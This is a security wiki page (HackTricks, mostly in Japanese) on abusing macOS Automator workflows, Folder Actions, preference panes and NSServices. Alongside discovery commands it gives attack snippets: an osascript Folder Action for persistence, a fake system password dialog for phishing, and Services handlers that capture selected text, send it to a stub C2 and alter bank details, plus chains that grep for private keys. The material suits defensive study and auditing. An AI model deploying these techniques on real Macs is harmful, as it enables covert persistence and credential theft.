# macOS Automator, Preference Panes & NSServices Abuse

{{#include ../../../banners/hacktricks-training.md}}

## Automator Actions & Workflows

### Basic Information

**Automator** は macOS のビジュアル自動化ツールです。**workflows** (`.workflow` bundles) を実行し、これは **actions** (`.action` bundles) で構成されます。Automator は **Folder Actions**、**Quick Actions**、および **Shortcuts** 連携も支えています。現代の macOS では、workflows は **Shortcuts にインポート**することもできるため、同じ悪意あるロジックが Finder の Quick Action、`~/Library/Services/` 配下のユーザーサービス、または従来の Automator actions を使う shortcut として現れる可能性があります。

Automator actions は、workflow 実行時に Automator runtime に読み込まれる **plugins** です。これらは次のことができます:
- 任意の shell scripts を実行する
- ファイルとデータを処理する
- AppleScript を介して applications とやり取りする
- 複雑な automation のために連結する

### Why This Matters

> [!WARNING]
> Automator workflows は実行を **social-engineered** される可能性があります — 単なる document files に見えるからです。`.workflow` bundle には、workflow 実行時に実行される埋め込み shell commands を含めることができます。Folder Actions と組み合わせると、file events をトリガーにする **automatic persistence** を提供します。最近の Gatekeeper の修正でも、**app-bundled Quick Actions** (`Contents/PlugIns/*.workflow`) は無害なデータではなく、実行可能な content として扱う必要があることが示されました。

### Discovery
```bash
# Find Automator actions installed on the system
find / -name "*.action" -path "*/Automator/*" -type d 2>/dev/null

# Find user-created workflows / Quick Actions
find ~/Library/Services -name "*.workflow" 2>/dev/null
find ~/Library/Workflows -name "*.workflow" 2>/dev/null
find /Applications -path "*/Contents/PlugIns/*.workflow" -type d 2>/dev/null

# Inspect the embedded workflow definition
plutil -p ~/Library/Services/*.workflow/Contents/document.wflow 2>/dev/null

# List active Folder Actions
defaults read ~/Library/Preferences/com.apple.FolderActionsDispatcher.plist 2>/dev/null

# Using the scanner
sqlite3 /tmp/executables.db "
SELECT e.path, h.handler_metadata
FROM executables e
JOIN executable_handlers eh ON e.id = eh.executable_id
JOIN handlers h ON eh.handler_id = h.id
WHERE h.handler_type = 'automator_action';"
```
### 攻撃: Social-Engineered Workflow

`.workflow` バンドルは、ほとんどのユーザーにとって通常のドキュメントファイルのように見える:
```bash
# Create a workflow programmatically
mkdir -p /tmp/Evil.workflow/Contents
cat > /tmp/Evil.workflow/Contents/document.wflow << 'PLIST'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>AMApplicationBuild</key>
<string>523</string>
<key>AMApplicationVersion</key>
<string>2.10</string>
<key>actions</key>
<array>
<dict>
<key>action</key>
<dict>
<key>AMActionVersion</key>
<string>2.0.3</string>
<key>AMApplication</key>
<array>
<string>Automator</string>
</array>
<key>AMBundleID</key>
<string>com.apple.RunShellScript</string>
</dict>
</dict>
</array>
</dict>
</plist>
PLIST
```
### Attack: Folder Action Persistence

Folder Actions は、監視対象のフォルダにファイルが追加されると自動的にワークフローを実行します:
```bash
# Register a Folder Action on ~/Downloads
# Every file the user downloads triggers the workflow

# Method 1: Via AppleScript
osascript -e '
tell application "System Events"
make new folder action at end of folder actions with properties {name:"Downloads", path:(path to downloads folder)}
tell folder action "Downloads"
make new script at end of scripts with properties {name:"Evil", path:"/path/to/evil.workflow"}
end tell
set folder actions enabled to true
end tell'

# Method 2: Via the Folder Actions Setup utility
# Users can be tricked into installing a Folder Action through a .workflow double-click
```
> [!CAUTION]
> Folder Actions は再起動後も永続し、静かに実行されます。`~/Downloads` に対する Folder Action は、**ダウンロードされたすべてのファイルがあなたの payload をトリガーする**ことを意味します — Safari、Chrome、AirDrop、メール添付からのファイルも含まれます。さらに、`System Events` は、既定の `~/Library/Scripts/Folder Action Scripts` の場所外にあるスクリプトを指す Folder Actions を登録できるため、loose-path hunting は有効です。関連する TCC の影響については、[the TCC page](../macos-security-protections/macos-tcc/README.md) を確認してください。

---

## Preference Panes

### Basic Information

Preference panes (`.prefPane` bundles) は、**System Settings**（旧 System Preferences）から読み込まれるプラグインです。これらは、システム機能やサードパーティ機能の設定 UI パネルを提供します。古いシステムでは `System Preferences` によって直接読み込まれていましたが、新しいリリースでは、サードパーティ pane は通常、System Settings から起動される **legacy loader XPC service** によって仲介されます。

### Why This Matters

- Preference panes は、System Settings / System Preferences によって生成された **trusted host process** で実行されます
- 現代のシステムでは、その host は **`legacyLoader` XPC service** である場合があるため、重要な境界は依然として **trusted Apple UI process -> third-party code loading**
- サードパーティの preference panes は、**host process security context** と、その UI に付与されたユーザーの信頼を継承します
- ユーザーは preference panes を **ダブルクリック**してインストールするため、簡単に social engineering が可能です
- 一度インストールされると、これらは **persist** し、System Settings がその panel を開くたびに読み込まれます

### Discovery
```bash
# Find installed preference panes
ls /Library/PreferencePanes/ 2>/dev/null
ls ~/Library/PreferencePanes/ 2>/dev/null
ls /System/Library/PreferencePanes/

# Check for non-Apple preference panes (third-party)
find /Library/PreferencePanes ~/Library/PreferencePanes -name "*.prefPane" 2>/dev/null

# Look for the modern host process used to load legacy panes
ps aux | egrep 'System Settings|System Preferences|legacyLoader'
log show --last 1h --predicate 'process == "legacyLoader" OR process == "System Settings" OR process == "System Preferences"' 2>/dev/null

# Using the scanner
sqlite3 /tmp/executables.db "
SELECT e.path, h.handler_metadata
FROM executables e
JOIN executable_handlers eh ON e.id = eh.executable_id
JOIN handlers h ON eh.handler_id = h.id
WHERE h.handler_type = 'preference_pane';"
```
### Attack: 特権コンテキスト乗っ取り

悪意のある preference pane は、**pane host** のセキュリティコンテキストを継承します（歴史的には `System Preferences`、新しいバージョンではしばしば `System Settings` によって起動される `legacyLoader` ヘルパー）:
```objc
// Preference pane principal class
@interface MaliciousPrefPane : NSPreferencePane
@end

@implementation MaliciousPrefPane
- (void)mainViewDidLoad {
[super mainViewDidLoad];
// This code runs inside the preference-pane host process
// It inherits that host's permissions / trust relationship

// Example: read files accessible to System Settings
NSData *data = [NSData dataWithContentsOfFile:@"/path/to/protected/file"];

// Example: use Accessibility API if System Settings has it
AXUIElementRef systemWide = AXUIElementCreateSystemWide();
// ... control other applications
}
@end
```
### Attack: インストールによる永続化
```bash
# Install a preference pane (user-level, no admin required)
cp -r /tmp/Evil.prefPane ~/Library/PreferencePanes/

# System-level (requires admin)
sudo cp -r /tmp/Evil.prefPane /Library/PreferencePanes/

# The pane loads every time the user opens System Settings and navigates to it
# For better persistence, set it as the default pane
```
### 攻撃: UI Phishing

Preference pane は正規の system UI パネルを模倣して、**credentials を phish する**ことができる:
```objc
// Display a fake authentication dialog
NSAlert *alert = [[NSAlert alloc] init];
alert.messageText = @"System Settings needs your password to make changes.";
alert.informativeText = @"Enter your password to allow this.";
[alert addButtonWithTitle:@"OK"];
[alert addButtonWithTitle:@"Cancel"];

NSSecureTextField *passwordField = [[NSSecureTextField alloc] initWithFrame:NSMakeRect(0, 0, 200, 24)];
alert.accessoryView = passwordField;
[alert runModal];

NSString *password = passwordField.stringValue;
// Exfiltrate password...
```
---

## NSServices

### Basic Information

**NSServices** は、アプリケーションが **Services menu**（右クリック → Services）を通じて他のアプリに機能を提供できるようにします。ユーザーがテキストやデータを選択して service を呼び出すと、選択されたデータは処理のために **service provider に送信**されます。

Services はアプリケーションの `Info.plist` の `NSServices` キーで宣言され、pasteboard server (`pbs`) に登録されます。macOS はまた、どの services を表示するか、sandboxed caller に追加の警告を出すべきかを決める **service cache** と **restriction policy** を保持しています。

### Why This Matters

- Services は **cross-application data flow** を受け取る — 任意のアプリケーションからの選択テキストが service に送られる
- 悪意のある service は password managers、email clients、financial apps からデータを取得できる
- Services は呼び出し元アプリケーションに **修正済みデータを返す** ことができる（selection operations に対する man-in-the-middle）
- Service 名は正規に見えるように作成できる（"Format Text", "Encrypt Selection", "Share"）
- 任意の `NSRestricted` フラグは security-relevant である: unrestricted とマークされた service は、escape-prone services に対して macOS が表示する警告なしで sandboxed app から呼び出せる可能性がある

### Discovery
```bash
# List all registered services
/System/Library/CoreServices/pbs -dump_pboard 2>/dev/null

# Find apps providing services
find /Applications -name "Info.plist" -exec grep -l "NSServices" {} \; 2>/dev/null

# Check specific app's services
defaults read /Applications/SomeApp.app/Contents/Info.plist NSServices 2>/dev/null

# Inspect the service cache and the built-in restriction policy
plutil -p ~/Library/Caches/com.apple.nsservicescache.plist 2>/dev/null
plutil -p ~/Library/Preferences/pbs.plist 2>/dev/null
plutil -p /System/Library/CoreServices/com.apple.NSServicesRestrictions.plist 2>/dev/null

# Hunt for services explicitly marked as restricted / unrestricted
find /Applications -name Info.plist -exec grep -Hn "NSRestricted" {} \; 2>/dev/null

# Using the scanner
sqlite3 /tmp/executables.db "
SELECT e.path, h.handler_metadata
FROM executables e
JOIN executable_handlers eh ON e.id = eh.executable_id
JOIN handlers h ON eh.handler_id = h.id
WHERE h.handler_type = 'service';"
```
### Attack: Data Interception Service
```xml
<!-- Info.plist NSServices declaration -->
<key>NSServices</key>
<array>
<dict>
<key>NSMessage</key>
<string>processSelection</string>
<key>NSPortName</key>
<string>EvilService</string>
<key>NSSendTypes</key>
<array>
<string>NSStringPboardType</string>
</array>
<key>NSMenuItem</key>
<dict>
<key>default</key>
<string>Format Selected Text</string>
</dict>
</dict>
</array>
```

```objc
// Service handler — receives user-selected text from any application
- (void)processSelection:(NSPasteboard *)pboard
userData:(NSString *)userData
error:(NSString **)error {
NSString *selectedText = [pboard stringForType:NSPasteboardTypeString];

// selectedText contains whatever the user selected in any app
// Could be a password, credit card number, private message, etc.

// Exfiltrate the captured data
[self sendToC2:selectedText];

// Optionally return the text unchanged so user doesn't notice
[pboard clearContents];
[pboard setString:selectedText forType:NSPasteboardTypeString];
}
```
### Attack: データ改ざん (Man-in-the-Middle)

サービスは、正当な機能を提供しているように見せかけながら、**返されるデータを改ざん**できます:
```objc
// A "Secure Encrypt" service that actually intercepts and modifies data
- (void)secureEncrypt:(NSPasteboard *)pboard
userData:(NSString *)userData
error:(NSString **)error {
NSString *original = [pboard stringForType:NSPasteboardTypeString];

// Log the original data (credential capture)
[self exfiltrate:original];

// Return modified data (e.g., replace bank account in a wire transfer)
NSString *modified = [original stringByReplacingOccurrencesOfString:@"original-account"
withString:@"attacker-account"];
[pboard clearContents];
[pboard setString:modified forType:NSPasteboardTypeString];
}
```
### Restricted Services & Modern Abuse

Apple は各サービス定義ごとに任意の `NSRestricted` boolean をサポートしています。これが設定されている場合、macOS は sandboxed 呼び出し元に警告します。なぜなら、そのサービスは **sandbox や privacy の境界を escape する** のに役立つ可能性があるからです。攻撃者の視点では、これにより 2 つの有用な監査経路が得られます。

- Apple Events、file access、または他の特権アクションを中継しているにもかかわらず、**restricted とマークされていない third-party services** を探す
- **強い entitlements を持つ高価値の built-in services**（たとえば Script Editor や Finder-backed helpers によって公開されるサービス）を探し、ユーザー操作だけで data-access primitive に変えられるか確認する

最近の良い例は **CVE-2022-48574** で、Services mechanism が悪用されて **期待される confirmation flow なしに TCC-protected user files に到達** できました。脆弱性は修正されていますが、この technique は threat modeling では今でも有用です。file access や automation requests を呼び出し元の代わりに forward する service は、同じ厳しさで精査すべきです。

---

## Recent Security Notes

- **Quick Actions are executable content**: Apple は 2024 年に Gatekeeper bypass を修正しました。アプリにバンドルされた Automator Quick Action が通常の assessment なしで実行できてしまう問題です。アプリを監査するときは、`Contents/PlugIns/*.workflow/Contents/document.wflow` を helper scripts や login items と同じように確認してください。See [the Gatekeeper page](../macos-security-protections/macos-gatekeeper.md).
- **Shortcuts can inherit legacy Automator behavior**: Apple はまた、third-party shortcuts が **legacy Automator action** を使って期待される permission flow なしに Apple Events を送信していたことが判明した後、追加の user-consent prompt を導入しました。imported workflows と shortcut bundles は `Run AppleScript`、`Run Shell Script`、および類似の bridge actions をレビューすべきです。See [the TCC page](../macos-security-protections/macos-tcc/README.md).
- **Automator is still a live privacy boundary**: Apple は 2025 年にも protected user data へのアクセスに関する別の Automator fix を公開しました。Automator が legacy surface だとしても、workflow runner、Quick Action host、automation bridge は dead code ではなく、現在の attack surface として扱ってください。

---

## Cross-Technique Attack Chains

### Automator Folder Action → Credential Harvesting
```
1. Install Folder Action on ~/Downloads
2. Workflow scans every downloaded file for credentials/keys
3. grep -r "BEGIN RSA PRIVATE KEY\|password\|token" on each file
4. Exfiltrate findings
```
### Preference Pane → TCC 権限昇格
```
1. Distribute malicious prefPane (social engineering)
2. User double-clicks → installed in ~/Library/PreferencePanes/
3. PrefPane is loaded by the System Settings / legacyLoader host
4. Inherits the host process trust and any useful entitlements / TCC posture
5. Access protected data, control other apps, or phish from a trusted Apple UI
```
### NSService → パスワードマネージャー窃取
```
1. Register a service named "Secure Copy"
2. User selects password in password manager
3. User right-clicks → Services → "Secure Copy"
4. Service receives the password text
5. Exfiltrate while placing it on clipboard normally
```
## 参考

* [Apple — About the security content of macOS Ventura 13.7, Sonoma 14.7, and Sequoia 15](https://support.apple.com/en-us/121238)
* [Moonlock — How the NSServices exploit worked on macOS](https://moonlock.com/nsservices-macos)

{{#include ../../../banners/hacktricks-training.md}}
